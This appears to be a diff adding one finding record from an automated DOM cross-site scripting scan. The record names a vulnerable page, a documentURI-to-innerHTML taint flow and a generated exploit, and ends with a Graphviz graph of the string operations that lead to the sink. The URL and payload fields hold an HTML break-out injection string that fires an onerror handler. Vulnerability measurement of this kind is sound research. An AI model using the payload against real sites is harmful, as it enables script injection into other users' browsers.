@@ -1,0 +1,98 @@
+// Finding: 1ee03208-4c6e-4c85-832b-fb55c364fe01
+// Finding.url: https://example185.com/project/miscevivybory2020/##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('04113608a84b45b4822e2407f87accfc')><!--/*
+// Finding.parentloc: https://example185.com/project/miscevivybory2020/##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('04113608a84b45b4822e2407f87accfc')><!--/*
+// Finding.domain: example185.com
+// Finding.base_domain: example185.com
+// Finding.source: document.documentURI
+// Finding.sink: innerHTML
+// Sanitizer.score: 3
+// Sanitizer.name: 
+// Sanitizer.location: https://example185.com/project/miscevivybory2020/##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('04113608a84b45b4822e2407f87accfc')><!--/* - <anonymous>:38:0
+// Finding.begin: 107
+// Finding.end: 336
+// Finding.original_uuid: 9e4c85e0-2a1d-4cfd-9100-92fc7c340b19
+// Finding.TwentyFiveMillionFlowsId: -574334811
+// Finding.script: https://example185.com/project/miscevivybory2020/js/jquery-1.10.2.min.js
+// Finding.line: 4
+// Exploit.uuid: 04113608-a84b-45b4-822e-2407f87accfc
+// Exploit.success: false
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: href
+// Exploit.quote_type: "
+// Exploit.tag: a
+// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 40
+// Exploit.replace_begin_url: 40
+// Exploit.replace_end_url: 40
+// Exploit.replace_begin_param: 322
+// Exploit.replace_end_param: 322
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -1528414703
+// DepGraph.sanitizer_hash: 1674627667
+
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="escape"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=ellipse, label="."];
+n4 [shape=box, label="Lit: <a href='//www.example428.com/click' target=_blank><img src='//counter.example240.com/hit?t39.6;r;s1366*768*24;u"];
+n5 [shape=ellipse, label="."];
+n6 [shape=box, label="Lit: ;h"];
+n7 [shape=ellipse, label="."];
+n8 [shape=box, label="Lit: %u041C%u0456%u0441%u0446%u0435%u0432%u0456%20%u0432%u0438%u043....u043D%u0448%u0438%u0445%20%u043C%u0456%u0441%u0442%u0430%u0445"];
+n9 [shape=ellipse, label="."];
+n10 [shape=box, label="Lit: ;"];
+n11 [shape=ellipse, label="."];
+n12 [shape=box, label="Lit: 0.42827619582542287"];
+n13 [shape=ellipse, label="."];
+n14 [shape=box, label="Lit: ' alt='' title='LiveInternet: показано число просмотров за 24 ....а 24 часа и за сегодня' border='0' width='31' height='31'></a>"];
+n15 [shape=ellipse, label="preg_replace"];
+n16 [shape=box, label="RegExp: /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/"];
+n17 [shape=box, label="Lit: <$1></$2>"];
+n18 [shape=box, label="Var: x"];
+n19 [shape=box, label="Var: x"];
+n20 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n3 -> n4;
+n3 -> n1;
+n5 -> n3;
+n5 -> n6;
+n7 -> n5;
+n7 -> n8;
+n9 -> n7;
+n9 -> n10;
+n11 -> n9;
+n11 -> n12;
+n13 -> n11;
+n13 -> n14;
+n18 -> n13;
+n15 -> n16;
+n15 -> n17;
+n15 -> n18;
+n19 -> n15;
+n20 -> n19;
+}
